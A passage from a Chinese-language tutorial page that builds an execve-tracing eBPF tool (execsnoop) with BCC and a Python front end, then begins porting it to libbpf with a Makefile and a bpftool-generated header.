字节，如果想要把它们读入一个临时的字符数组中，必须要保证每次读取的内容不超过栈的大小。这类问题有很多种不同的处理方法，其中一个比较简单的方式就是<strong>把多余的参数截断，使用<code>...</code>代替过长的参数</strong>。一般来说，知道了进程的名称和前几个参数，对调试和排错来说就足够了。</p><p>你可以定义最大读取的参数个数和参数长度，然后在哈希映射的值中定义一个字符数组，代码如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义参数长度和参数个数常量</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ARGSIZE 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TOTAL_MAX_ARGS 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FULL_MAX_ARGS_ARR (TOTAL_MAX_ARGS * ARGSIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">data_t</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="type">char</span> argv[FULL_MAX_ARGS_ARR];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>有了字符数组，接下来再定义一个辅助函数，从参数数组中读取字符串参数（限定最长  <code>ARGSIZE</code>）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从用户空间读取字符串</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __bpf_read_arg_str(<span class="keyword">struct</span> <span class="type">data_t</span> *data, <span class="type">const</span> <span class="type">char</span> *ptr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (data-&gt;args_size &gt; LAST_ARG) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> ret = bpf_probe_read_user_str(&amp;data-&gt;argv[data-&gt;args_size], ARGSIZE, (<span class="type">void</span> *)ptr);</span><br><span class="line">    <span class="keyword">if</span> (ret &gt; ARGSIZE || ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// increase the args size. the first tailing &#x27;\0&#x27; is not counted and hence it</span></span><br><span class="line">    <span class="comment">// would be overwritten by the next call.</span></span><br><span class="line">    data-&gt;args_size += (ret - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个函数中，有几点需要你注意：</p><ul><li><code>bpf_probe_read_user_str()</code>  返回的是包含字符串结束符 <code>\0</code> 的长度。为了拼接所有的字符串，在计算已读取参数长度的时候，需要把 <code>\0</code> 排除在外。</li><li><code>&amp;data-&gt;argv[data-&gt;args_size]</code>  用来获取要存放参数的位置指针，这是为了把多个参数拼接到一起。</li><li>在调用 <code>bpf_probe_read_user_str()</code> 前后，需要对指针位置和返回值进行校验，这可以帮助 eBPF 验证器获取指针读写的边界（如果你感兴趣，可以参考<a class="link" href="https://sysdig.com/blog/the-art-of-writing-ebpf-programs-a-primer/">这篇文章<i class="fas fa-external-link-alt"></i></a>，了解更多的内存访问验证细节）。</li><li>在调用 <code>bpf_probe_read_user_str()</code> 前后，需要对指针位置和返回值进行校验，这可以帮助 eBPF 验证器获取指针读写的边界（如果你感兴趣，可以参考这篇文章，了解更多的内存访问验证细节）。</li></ul><p>有了这个辅助函数之后，因为 eBPF 在老版本内核中并不支持循环（有界循环在 5.3 之后才支持），要访问字符串数组，还需要一个小技巧：使用 <code>#pragma unroll</code> 告诉编译器，把源码中的循环自动展开。这就避免了最终的字节码中包含循环。</p><p>完整的处理函数如下所示（具体的每一步我都加了详细的注释，你可以参考注释来加深理解）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引入内核头文件</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;uapi/linux/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义sys_enter_execve跟踪点处理函数.</span></span><br><span class="line">TRACEPOINT_PROBE(syscalls, sys_enter_execve)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 变量定义</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> **argv = (<span class="type">const</span> <span class="type">char</span> **)(args-&gt;argv);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取进程PID和进程名称</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">data_t</span> <span class="title">data</span> =</span> &#123; &#125;;</span><br><span class="line">    u32 pid = bpf_get_current_pid_tgid();</span><br><span class="line">    data.pid = pid;</span><br><span class="line">    bpf_get_current_comm(&amp;data.comm, <span class="keyword">sizeof</span>(data.comm));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取第一个参数（即可执行文件的名字）</span></span><br><span class="line">    <span class="keyword">if</span> (__bpf_read_arg_str(&amp;data, (<span class="type">const</span> <span class="type">char</span> *)argv[<span class="number">0</span>]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取其他参数（限定最多5个）</span></span><br><span class="line">    <span class="meta">#<span class="keyword">pragma</span> unrollfor (int i = 1; i &lt; TOTAL_MAX_ARGS; i++) &#123;</span></span><br><span class="line">        <span class="keyword">if</span> (__bpf_read_arg_str(&amp;data, (<span class="type">const</span> <span class="type">char</span> *)argv[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> out:</span><br><span class="line">    <span class="comment">// 存储到哈希映射中</span></span><br><span class="line">    tasks.update(&amp;pid, &amp;data);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意，为了获取内核数据结构的定义，在文件的开头需要引入相关的内核头文件。此外，读取参数完成之后，不要忘记调用 <code>tasks.update()</code> 把进程的基本信息存储到哈希映射中。因为返回值需要等到出口跟踪点时才可以获取，这儿只需要更新哈希映射就可以了，不需要把进程信息提交到性能事件映射中去。</p><h3 id="出口跟踪点处理"><a href="#出口跟踪点处理" class="headerlink" title="出口跟踪点处理"></a>出口跟踪点处理</h3><p>入口跟踪点  <code>sys_enter_execve</code>  处理好之后，我们再来看看出口跟踪点  <code>sys_exit_execve</code>  该如何处理。</p><p>由于进程的基本信息已经保存在了哈希映射中，所以出口事件的处理可以分为查询进程基本信息、填充返回值、最后再提交到性能事件映射这三个步骤。具体代码如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义sys_exit_execve跟踪点处理函数.</span></span><br><span class="line">TRACEPOINT_PROBE(syscalls, sys_exit_execve)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 从哈希映射中查询进程基本信息</span></span><br><span class="line">    u32 pid = bpf_get_current_pid_tgid();</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">data_t</span> *<span class="title">data</span> =</span> tasks.lookup(&amp;pid);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 填充返回值并提交到性能事件映射中</span></span><br><span class="line">    <span class="keyword">if</span> (data != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        data-&gt;retval = args-&gt;ret;</span><br><span class="line">        events.perf_submit(args, data, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> <span class="type">data_t</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 最后清理进程信息</span></span><br><span class="line">        tasks.delete(&amp;pid);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到这里，完整的 eBPF 程序就开发好了，你可以把上述的代码保存到一个本地文件中，并命名为  <code>execsnoop.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Tracing execve system call. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// consts for arguments (ensure below stack size limit 512)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ARGSIZE 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TOTAL_MAX_ARGS 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FULL_MAX_ARGS_ARR (TOTAL_MAX_ARGS * ARGSIZE)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LAST_ARG (FULL_MAX_ARGS_ARR - ARGSIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// perf event map (sharing data to userspace) and hash map (sharing data between tracepoints)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">data_t</span> &#123;</span></span><br><span class="line">u32 pid;</span><br><span class="line"><span class="type">char</span> comm[TASK_COMM_LEN];</span><br><span class="line"><span class="type">int</span> retval;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> args_size;</span><br><span class="line"><span class="type">char</span> argv[FULL_MAX_ARGS_ARR];</span><br><span class="line">&#125;;</span><br><span class="line">BPF_PERF_OUTPUT(events);</span><br><span class="line">BPF_HASH(tasks, u32, <span class="keyword">struct</span> <span class="type">data_t</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// helper function to read string from userspace.</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __bpf_read_arg_str(<span class="keyword">struct</span> <span class="type">data_t</span> *data, <span class="type">const</span> <span class="type">char</span> *ptr)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (data-&gt;args_size &gt; LAST_ARG) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ret = bpf_probe_read_user_str(&amp;data-&gt;argv[data-&gt;args_size], ARGSIZE,</span><br><span class="line">  (<span class="type">void</span> *)ptr);</span><br><span class="line"><span class="keyword">if</span> (ret &gt; ARGSIZE || ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// increase the args size. the first tailing &#x27;\0&#x27; is not counted and hence it</span></span><br><span class="line"><span class="comment">// would be overwritten by the next call.</span></span><br><span class="line">data-&gt;args_size += (ret - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// sys_enter_execve tracepoint.</span></span><br><span class="line">TRACEPOINT_PROBE(syscalls, sys_enter_execve)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// variables definitions</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> **argv = (<span class="type">const</span> <span class="type">char</span> **)(args-&gt;argv);</span><br><span class="line"></span><br><span class="line"><span class="comment">// get the pid and comm</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">data_t</span> <span class="title">data</span> =</span> &#123; &#125;;</span><br><span class="line">u32 pid = bpf_get_current_pid_tgid();</span><br><span class="line">data.pid = pid;</span><br><span class="line">bpf_get_current_comm(&amp;data.comm, <span class="keyword">sizeof</span>(data.comm));</span><br><span class="line"></span><br><span class="line"><span class="comment">// get the binary name (first argment)</span></span><br><span class="line"><span class="keyword">if</span> (__bpf_read_arg_str(&amp;data, (<span class="type">const</span> <span class="type">char</span> *)argv[<span class="number">0</span>]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// get other arguments (skip first arg because it has already been read)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> unroll</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; TOTAL_MAX_ARGS; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (__bpf_read_arg_str(&amp;data, (<span class="type">const</span> <span class="type">char</span> *)argv[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> out:</span><br><span class="line"><span class="comment">// store the data in hash map</span></span><br><span class="line">tasks.update(&amp;pid, &amp;data);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// sys_exit_execve tracepoint</span></span><br><span class="line">TRACEPOINT_PROBE(syscalls, sys_exit_execve)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// query the data from hash map</span></span><br><span class="line">u32 pid = bpf_get_current_pid_tgid();</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">data_t</span> *<span class="title">data</span> =</span> tasks.lookup(&amp;pid);</span><br><span class="line"></span><br><span class="line"><span class="comment">// submit perf events after getting the retval</span></span><br><span class="line"><span class="keyword">if</span> (data != <span class="literal">NULL</span>) &#123;</span><br><span class="line">data-&gt;retval = args-&gt;ret;</span><br><span class="line">events.perf_submit(args, data, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> <span class="type">data_t</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// clean up the hash map</span></span><br><span class="line">tasks.delete(&amp;pid);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Python-前端处理"><a href="#Python-前端处理" class="headerlink" title="Python 前端处理"></a>Python 前端处理</h3><p>eBPF 程序开发完成后，最后一步就是为它增加一个 Python 前端。</p><p>同之前写的 Hello World 类似，<strong>Python 前端逻辑需要 eBPF 程序加载、挂载到内核函数和跟踪点，以及通过 BPF 映射获取和打印执行结果等几个步骤</strong>。其中，因为我们已经使用了 <code>TRACEPOINT_PROBE</code> 宏定义，来定义 eBPF 跟踪点处理函数，BCC 在加载字节码的时候，会帮你自动把它挂载到正确的跟踪点上，所以挂载的步骤就可以忽略。完整的 Python 程序如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 引入库函数</span></span><br><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"><span class="keyword">from</span> bcc.utils <span class="keyword">import</span> printb</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1) 加载eBPF代码</span></span><br><span class="line">b = BPF(src_file=<span class="string">&quot;execsnoop.c&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2) 输出头</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%-6s %-16s %-3s %s&quot;</span> % (<span class="string">&quot;PID&quot;</span>, <span class="string">&quot;COMM&quot;</span>, <span class="string">&quot;RET&quot;</span>, <span class="string">&quot;ARGS&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3) 定义性能事件打印函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_event</span>(<span class="params">cpu, data, size</span>):</span><br><span class="line">    <span class="comment"># BCC自动根据&quot;struct data_t&quot;生成数据结构</span></span><br><span class="line">    event = b[<span class="string">&quot;events&quot;</span>].event(data)</span><br><span class="line">    printb(<span class="string">b&quot;%-6d %-16s %-3d %-16s&quot;</span> % (event.pid, event.comm, event.retval, event.argv))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4) 绑定性能事件映射和输出函数，并从映射中循环读取数据</span></span><br><span class="line">b[<span class="string">&quot;events&quot;</span>].open_perf_buffer(print_event)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        b.perf_buffer_poll()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure><p>把上述的代码保存到  execsnoop.py  中，然后通过 Python 运行，并在另一个终端中执行  ls  命令，你就可以得到如下的输出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ sudo python3 execsnoop.py</span><br><span class="line">PID    COMM             RET ARGS</span><br><span class="line">1311958 barad_agent      0   /bin/sh-ccat /proc/meminfo |grep <span class="string">&#x27;HardwareCorrupted&#x27;</span> |awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span></span><br><span class="line">1311959 sh               0   <span class="built_in">cat</span>/proc/meminfo</span><br><span class="line">1311960 sh               0   grepHardwareCorrupted</span><br><span class="line">1311961 sh               0   awk&#123;<span class="built_in">print</span> <span class="variable">$2</span>&#125;</span><br></pre></td></tr></table></figure><p>到此处，我们就开发了一个新的 eBPF 程序，它的作用也是排查短时进程相关的性能。</p><p>不过，在你想要分发这个程序到生产环境时，又会碰到一个新的难题：BCC 依赖于 LLVM 和内核头文件才可以动态编译和加载 eBPF 程序，而出于安全策略的需要，在生产环境中通常又不允许安装这些开发工具。</p><p>这个难题应该怎么克服呢？一种很容易想到的方法是把 BCC 和开发工具都安装到容器中，容器本身不提供对外服务，这样可以降低安全风险。另外一种方法就是参考内核中的 <a class="link" href="https://elixir.bootlin.com/linux/v5.13/source/samples/bpf">eBPF 示例<i class="fas fa-external-link-alt"></i></a>，开发一个匹配当前内核版本的 eBPF 程序，并编译为字节码，再分发到生产环境中。</p><p>除此之外，如果你的内核已经支持了 BPF 类型格式 (BTF)，我推荐你使用从内核源码中抽离出来的 libbpf 进行开发，这样可以借助 BTF 和 CO-RE 获得更好的移植性。实际上，BCC 的很多工具都在向 BTF 迁移中，相信未来 libbpf 会成为最受欢迎的 eBPF 程序开发基础库，甚至 Windows eBPF 也会支持 libbpf。</p><h2 id="libbpf-开发内核追踪程序"><a href="#libbpf-开发内核追踪程序" class="headerlink" title="libbpf 开发内核追踪程序"></a>libbpf 开发内核追踪程序</h2><h3 id="libbpf-方法"><a href="#libbpf-方法" class="headerlink" title="libbpf 方法"></a>libbpf 方法</h3><p>那么，如何用 libbpf 来开发一个 eBPF 程序呢？跟刚才的 BCC 程序类似，使用 libbpf 开发 eBPF 程序也是分为两部分：</p><ul><li>第一，内核态的 eBPF 程序；</li><li>第二，用户态的加载、挂载、映射读取以及输出程序等。</li></ul><p><strong>在 eBPF 程序中，由于内核已经支持了 BTF，你不再需要引入众多的内核头文件来获取内核数据结构的定义</strong>。取而代之的是一个通过 bpftool 生成的 <code>vmlinux.h</code>  头文件，其中包含了内核数据结构的定义。</p><p>这样，使用 libbpf 开发 eBPF 程序就可以通过以下四个步骤完成：</p><ol><li>使用 bpftool 生成内核数据结构定义头文件。BTF 开启后，你可以在系统中找到  <code>/sys/kernel/btf/vmlinux</code>  这个文件，bpftool 正是从它生成了内核数据结构头文件。</li><li>开发 eBPF 程序部分。为了方便后续通过统一的 Makefile 编译，eBPF 程序的源码文件一般命名为  <code>&lt;程序名&gt;.bpf.c</code>。</li><li>编译 eBPF 程序为字节码，然后再调用 <code>bpftool gen skeleton</code> 为 eBPF 字节码生成脚手架头文件（Skeleton Header）。这个头文件包含了 eBPF 字节码以及相关的加载、挂载和卸载函数，可在用户态程序中直接调用。</li><li>最后就是用户态程序引入上一步生成的头文件，开发用户态程序，包括 eBPF 程序加载、挂载到内核函数和跟踪点，以及通过 BPF 映射获取和打印执行结果等。</li></ol><p>通常，这几个步骤里面的编译、库链接、执行 <code>bpftool</code>  命令等，都可以放到 Makefile 中，这样就可以通过一个 <code>make</code> 命令去执行所有的步骤。比如，下面是一个简化版本的 Makefile：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">APPS = execsnoop</span><br><span class="line"></span><br><span class="line">.PHONY: all</span><br><span class="line">all: $(APPS)</span><br><span class="line"></span><br><span class="line">$(APPS):</span><br><span class="line">    clang -g -O2 -target bpf -D__TARGET_ARCH_x86_64 -I/usr/include/x86_64-linux-gnu -I. -c $@.bpf.c -o $@.bpf.o</span><br><span class="line">    bpftool gen skeleton $@.bpf.o &gt; $@.skel.h</span><br><span class="line">    clang -g -O2 -Wall -I . -c $@.c -o $@.o</span><br><span class="line">    clang -Wall -O2 -g $@.o -<span class="type">static</span> -lbpf -lelf -lz -o $@</span><br><span class="line"></span><br><span class="line">vmlinux:</span><br><span class="line">    $(bpftool) btf dump file /sys/kernel/btf/vmlinux format c &gt; vmlinux.h</span><br></pre></td></tr></table></figure><p>有了这个 Makefile 之后，你执行 <code>make vmlinux</code> 命令就可以生成 <code>vmlinux.h</code> 文件，再执行 <code>make</code> 就可以编译  <code>APPS</code> 里面配置的所有 eBPF 程序（多个程序之间以空格分隔）。</p><h3 id="内核头文件生成"><a href="#内核头文件生成" class="headerlink" title="内核头文件生成"></a>内核头文件生成</h3><p>首先，对于第一步，我们只需要执行下面的命令，即可生成内核数据结构的头文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo bpftool btf dump file /sys/kernel/btf/vmlinux format c &gt; vmlinux.h</span><br></pre></td></tr></table></figure><p>如果命令执行失败了，并且错误说 BTF 不存在，那说明当前系统内核没有开启 BTF 特性。这时候，你需要开启 <code>CONFIG_DEBUG_INFO_BTF=y</code> 和 <code>CONFIG_DEBUG_INFO=y</code> 这两个编译选项，然后重新编译和安装内核。</p><h3 id="eBPF-程序定义"><a href="#eBPF-程序定义" class="headerlink" title="eBPF 程序定义"></a>eBPF 程序定义</h3><p>第二步就是开发 eBPF 程序，包括定义哈希映射、性能事件映射以及跟踪点的处理函数等，而对这些数据结构和跟踪函数的定义都可以通过 <code>SEC()</code> 宏定义来完成。在编译时，<strong>通过 <code>SEC()</code> 宏定义的数据结构和函数会放到特定的 ELF 段中，这样后续在加载 BPF 字节码时，就可以从这些段中获取所需的元数据</strong>。</p><p>比如，你可以使用下面的代码来定义映射和跟踪点处理函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 包含头文件</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;vmlinux.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bpf/bpf_helpers.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义进程基本信息数据结构</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> comm[TASK_COMM_LEN];</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="type">int</span> retval;</span><br><span class="line">    <span class="type">int</span> args_count;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> args_size;</span><br><span class="line">    <span class="type">char</span> args[FULL_MAX_ARGS_ARR];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义哈希映射</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    __uint(type, BPF_MAP_TYPE_HASH);</span><br><span class="line">    __uint(max_entries, <span class="number">10240</span>);</span><br><span class="line">    __type(key, <span 